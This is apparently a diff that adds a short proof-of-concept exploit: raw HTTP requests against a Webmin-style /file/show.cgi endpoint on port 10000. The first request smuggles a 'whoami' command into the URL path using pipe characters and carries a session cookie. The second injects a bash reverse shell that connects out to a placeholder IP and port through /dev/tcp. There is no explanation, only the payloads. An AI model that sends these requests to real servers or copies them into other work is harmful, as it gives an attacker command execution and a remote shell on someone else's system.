@@ -1,0 +1,23 @@
+GET /file/show.cgi/bin/echo|whoami| HTTP/1.1
+
+Host: localhost:10000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Cookie: testing=1; sid=026fd0b4a7fbaa898e636743591e1354
+
+Upgrade-Insecure-Requests: 1 
+
+
+GET /file/show.cgi/bin/echo|bash%20-i%20>&%20/dev/tcp/[IP]/[PORT]%200>&1| HTTP/1.1
+
+
+
